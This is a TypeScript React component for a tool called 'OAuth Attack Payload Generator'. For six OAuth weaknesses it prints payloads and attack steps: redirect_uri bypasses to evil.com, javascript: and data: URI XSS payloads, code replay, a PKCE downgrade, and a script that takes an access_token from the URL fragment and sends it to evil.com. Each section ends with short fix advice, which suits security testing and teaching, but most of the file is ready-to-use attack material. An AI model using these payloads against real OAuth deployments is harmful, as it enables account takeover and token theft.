import SimpleTool from '../../_shared/SimpleTool';
import type { ToolProps } from '../../types';

/* ============================================================
 * OAuth Attack Payload Generator
 * Generates payloads for various OAuth flow vulnerabilities.
 * ========================================================== */

const generateAttack = (authEndpoint: string, vuln: string): string => {
  const ep = authEndpoint.trim() || 'https://target.com/oauth/authorize';
  const lines: string[] = [];
  lines.push(`── OAuth 攻击 (${vuln}) ──`);
  lines.push(` [授权端点] ${ep}`);
  lines.push('');

  if (vuln === 'redirect-uri-bypass') {
    lines.push(' ▸ Redirect URI 绕过技术:');
    lines.push('');
    lines.push('   # 1. 子域名匹配绕过:');
    lines.push(`   redirect_uri=https://evil.target.com/callback`);
    lines.push('   # 如果服务端检查 startsWith("target.com") 或正则不严格');
    lines.push('');
    lines.push('   # 2. 路径绕过:');
    lines.push('   redirect_uri=https://target.com.evil.com/callback');
    lines.push('   redirect_uri=https://evil.com/callback#target.com');
    lines.push('   redirect_uri=https://evil.com/callback?target.com');
    lines.push('   redirect_uri=https://target.com/redirect?url=https://evil.com');
    lines.push('');
    lines.push('   # 3. 开放重定向利用:');
    lines.push('   redirect_uri=https://target.com/redirect?next=https://evil.com');
    lines.push('   # 利用目标站自身的开放重定向');
    lines.push('');
    lines.push('   # 4. 协议绕过:');
    lines.push('   redirect_uri=javascript://evil.com/%0falert(1)');
    lines.push('   redirect_uri=data:text/html,<script>alert(1)</script>');
    lines.push('');
    lines.push('   # 5. 本地端口绕过:');
    lines.push('   redirect_uri=http://127.0.0.1:8080/callback');
    lines.push('   redirect_uri=http://localhost/callback');
    lines.push('');
    lines.push(' ▸ 完整攻击 URL:');
    lines.push(`   ${ep}?response_type=code&client_id=CLIENT_ID&redirect_uri=https://evil.com/callback&scope=read`);
    lines.push('');
    lines.push(' ▸ 攻击步骤:');
    lines.push('   1. 构造恶意 redirect_uri 绕过白名单');
    lines.push('   2. 诱导受害者点击链接完成授权');
    lines.push('   3. 授权码被发送到攻击者控制的服务器');
    lines.push('   4. 用授权码换取 access_token');
    lines.push('');
    lines.push(' ▸ 修复建议:');
    lines.push('   - 严格匹配 redirect_uri (完全匹配, 非前缀匹配)');
    lines.push('   - 使用白名单机制, 禁止通配符');
    lines.push('   - 验证 redirect_uri 的协议和路径');
  }

  if (vuln === 'missing-state') {
    lines.push(' ▸ 缺少 State 参数攻击:');
    lines.push('');
    lines.push('   # 攻击者用自己的账号获取授权码:');
    lines.push(`   ${ep}?response_type=code&client_id=CLIENT_ID&redirect_uri=https://app.com/callback`);
    lines.push('   # 注意: 不包含 state 参数');
    lines.push('');
    lines.push('   # 攻击者获取授权码后, 诱导受害者使用该码登录:');
    lines.push('   https://app.com/callback?code=ATTACKER_CODE');
    lines.push('   # 受害者的会话被绑定到攻击者的授权码');
    lines.push('   # 攻击者随后用该 code 换取 token, 获得受害者账号访问权');
    lines.push('');
    lines.push(' ▸ 攻击步骤:');
    lines.push('   1. 攻击者用自己的账号发起 OAuth 授权');
    lines.push('   2. 拦截授权码 (不完成 token 交换)');
    lines.push('   3. 将包含恶意 code 的 URL 发送给受害者');
    lines.push('   4. 受害者点击链接, 其会话与攻击者的 code 绑定');
    lines.push('   5. 攻击者完成 token 交换, 获取受害者会话的访问权');
    lines.push('');
    lines.push(' ▸ 修复建议:');
    lines.push('   - 必须使用 state 参数 (随机不可预测)');
    lines.push('   - 验证 state 与会话绑定的值一致');
    lines.push('   - state 应为一次性使用, 使用后失效');
  }

  if (vuln === 'code-replay') {
    lines.push(' ▸ 授权码重放攻击:');
    lines.push('');
    lines.push('   # 捕获授权码后多次使用:');
    lines.push('   https://app.com/callback?code=CAPTURED_CODE');
    lines.push('');
    lines.push('   # 在 token 端点重放:');
    lines.push('   POST /oauth/token');
    lines.push('   grant_type=authorization_code');
    lines.push('   code=CAPTURED_CODE');
    lines.push('   redirect_uri=https://app.com/callback');
    lines.push('   client_id=CLIENT_ID');
    lines.push('   client_secret=SECRET (confidential client)');
    lines.push('');
    lines.push(' ▸ 攻击步骤:');
    lines.push('   1. 通过中间人/XSS/日志/Referer 获取授权码');
    lines.push('   2. 在 code 过期前多次提交换取 token');
    lines.push('   3. 如果服务端不校验 code 唯一性, 可多次获取 token');
    lines.push('');
    lines.push(' ▸ 修复建议:');
    lines.push('   - 授权码一次性使用, 使用后立即失效');
    lines.push('   - 设置短过期时间 (建议 < 10 分钟)');
    lines.push('   - 绑定 code 到特定 client_id 和 redirect_uri');
    lines.push('   - 记录已使用的 code, 拒绝重放');
  }

  if (vuln === 'token-leak') {
    lines.push(' ▸ Token 泄露攻击:');
    lines.push('');
    lines.push('   # 1. Implicit Flow token 泄露 (URL fragment):');
    lines.push('   https://app.com/callback#access_token=TOKEN&token_type=bearer');
    lines.push('   # token 在 URL fragment 中, 通过 Referer/日志/浏览器历史泄露');
    lines.push('');
    lines.push('   # 2. Referer 泄露:');
    lines.push('   # token 在 URL 中, 页面加载外部资源时 Referer 头泄露 token');
    lines.push('   <img src="https://evil.com/log?token=TOKEN">');
    lines.push('');
    lines.push('   # 3. 日志泄露:');
    lines.push('   # 服务器访问日志/代理日志中记录了含 token 的 URL');
    lines.push('   # 攻击者获取日志后提取 token');
    lines.push('');
    lines.push('   # 4. 浏览器历史泄露:');
    lines.push('   # token 在 URL 中, 存储在浏览器历史记录中');
    lines.push('   # 共享设备或恶意扩展可读取');
    lines.push('');
    lines.push('   # 5. postMessage 漏洞:');
    lines.push('   window.postMessage(\'{"access_token":"TOKEN"}\', \'*\')');
    lines.push('   # 如果 targetOrigin 为 *, token 可被任意窗口截获');
    lines.push('');
    lines.push(' ▸ 攻击步骤:');
    lines.push('   1. 获取含 token 的 URL (日志/Referer/历史)');
    lines.push('   2. 提取 access_token');
    lines.push('   3. 直接使用 token 访问 API');
    lines.push('');
    lines.push(' ▸ 修复建议:');
    lines.push('   - 使用 Authorization Code Flow (不在 URL 中返回 token)');
    lines.push('   - 避免 Implicit Flow');
    lines.push('   - 设置 Referrer-Policy: no-referrer');
    lines.push('   - token 存储在 HttpOnly Cookie 或内存中');
  }

  if (vuln === 'pkce-downgrade') {
    lines.push(' ▸ PKCE 降级攻击:');
    lines.push('');
    lines.push('   # 攻击者在授权请求中移除 PKCE 参数:');
    lines.push('   # 正常请求:');
    lines.push(`   ${ep}?response_type=code&client_id=ID&redirect_uri=https://app.com/callback&code_challenge=VERIFIER_HASH&code_challenge_method=S256`);
    lines.push('');
    lines.push('   # 降级请求 (移除 PKCE):');
    lines.push(`   ${ep}?response_type=code&client_id=ID&redirect_uri=https://evil.com/callback`);
    lines.push('');
    lines.push('   # 如果服务端不强制要求 PKCE, 可省略 code_challenge');
    lines.push('   # 在 token 交换时也不需要 code_verifier');
    lines.push('');
    lines.push(' ▸ Token 交换 (无 PKCE):');
    lines.push('   POST /oauth/token');
    lines.push('   grant_type=authorization_code');
    lines.push('   code=STOLEN_CODE');
    lines.push('   redirect_uri=https://evil.com/callback');
    lines.push('   client_id=CLIENT_ID');
    lines.push('   # 无需 code_verifier');
    lines.push('');
    lines.push(' ▸ 攻击步骤:');
    lines.push('   1. 客户端使用 PKCE 发起授权');
    lines.push('   2. 攻击者拦截并修改请求, 移除 PKCE 参数');
    lines.push('   3. 如果服务端不强制 PKCE, 授权码可被窃取使用');
    lines.push('   4. 攻击者用授权码换取 token, 无需 code_verifier');
    lines.push('');
    lines.push(' ▸ 修复建议:');
    lines.push('   - 服务端强制要求 PKCE (拒绝无 code_challenge 的请求)');
    lines.push('   - 验证 code_challenge_method 为 S256 (非 plain)');
    lines.push('   - Token 端点验证 code_verifier 与 code_challenge 匹配');
  }

  if (vuln === 'implicit-flow') {
    lines.push(' ▸ Implicit Flow 攻击:');
    lines.push('');
    lines.push('   # Implicit Flow 直接在 redirect 返回 access_token:');
    lines.push(`   ${ep}?response_type=token&client_id=CLIENT_ID&redirect_uri=https://app.com/callback`);
    lines.push('');
    lines.push('   # 响应 (URL fragment):');
    lines.push('   https://app.com/callback#access_token=eyJhbG...&token_type=bearer&expires_in=3600');
    lines.push('');
    lines.push(' ▸ 攻击向量:');
    lines.push('');
    lines.push('   # 1. XSS 窃取 token:');
    lines.push('   <script>');
    lines.push('     var token = location.hash.match(/access_token=([^&]*)/)[1];');
    lines.push('     new Image().src = "https://evil.com/log?token=" + token;');
    lines.push('   </script>');
    lines.push('');
    lines.push('   # 2. 恶意 redirect_uri 配合:');
    lines.push('   redirect_uri=https://target.com/openredirect?url=https://evil.com');
    lines.push('   # token 被发送到 evil.com');
    lines.push('');
    lines.push('   # 3. postMessage 劫持:');
    lines.push('   # 如果页面使用 postMessage 传递 token, 劫持目标 origin');
    lines.push('');
    lines.push(' ▸ 攻击步骤:');
    lines.push('   1. 构造 Implicit Flow 授权 URL');
    lines.push('   2. 通过 XSS/开放重定向/Referer 窃取 token');
    lines.push('   3. 直接使用 access_token 访问 API');
    lines.push('   4. token 无法撤销 (无 refresh_token 机制)');
    lines.push('');
    lines.push(' ▸ 修复建议:');
    lines.push('   - 使用 Authorization Code Flow with PKCE 代替 Implicit Flow');
    lines.push('   - Implicit Flow 已在 OAuth 2.1 中废弃');
    lines.push('   - token 不应出现在 URL 中');
  }

  lines.push('');
  return lines.join('\n');
};

const ToolComponent = (props: ToolProps) => (
  <SimpleTool
    {...props}
    toolName="OAuth流程攻击"
    paramsConfig={[
      {
        name: 'vuln',
        label: '漏洞类型',
        type: 'select',
        default: 'redirect-uri-bypass',
        options: [
          { value: 'redirect-uri-bypass', label: 'Redirect URI 绕过' },
          { value: 'missing-state', label: '缺少 State' },
          { value: 'code-replay', label: '授权码重放' },
          { value: 'token-leak', label: 'Token 泄露' },
          { value: 'pkce-downgrade', label: 'PKCE 降级' },
          { value: 'implicit-flow', label: 'Implicit Flow' },
        ],
      },
    ]}
    execute={(input: string, _mode: string, params: Record<string, unknown>): string => {
      const vuln = (params.vuln as string) ?? 'redirect-uri-bypass';
      return generateAttack(input, vuln);
    }}
  />
);
export default ToolComponent;
